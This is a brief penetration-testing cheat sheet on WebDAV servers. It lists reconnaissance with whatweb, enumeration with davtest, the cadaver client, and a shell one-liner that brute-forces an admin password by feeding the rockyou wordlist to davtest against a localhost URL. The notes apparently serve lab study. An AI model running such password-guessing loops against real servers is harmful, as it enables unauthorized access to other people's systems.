# WebDAV
Tool to manage file and directories using a **web** server.
- Reconnaissance with `whatweb "http://127.0.0.1/" `.
- Use **davtest** to enumerate the *webDAV* server, which files are allowed, executable, etc. `davtest -url <URL> -auth <USER>:<PASSWORD>`.
- Script to do a *brute force* to get the password.
	```shell
	cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://127.0.0.1/ -auth admin:$password 2>&1 | grep -i succeed); if [ $response ]; then echo "Correct password: $password"; break ; fi; done
	```
- WebDAV **CLI** tool -> **cadaver** `cadaver http://127.0.0.1`.